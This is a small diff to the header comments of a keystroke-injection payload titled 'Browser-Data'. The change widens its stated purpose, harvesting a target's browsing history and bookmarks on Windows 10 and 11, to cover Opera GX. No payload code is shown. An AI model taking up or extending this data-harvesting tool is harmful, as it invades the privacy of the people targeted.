@@ -2,7 +2,7 @@ REM     Title: Browser-Data
 
 REM     Author: I am Jakoby
 
-REM     Description: This payload will grab your targets brosing history and bookmarks from IE, Chrome, and Firefox
+REM     Description: This payload will grab your targets brosing history and bookmarks from IE, Chrome, Firefox, and Opera GX.
 
 REM     Target: Windows 10, 11
 
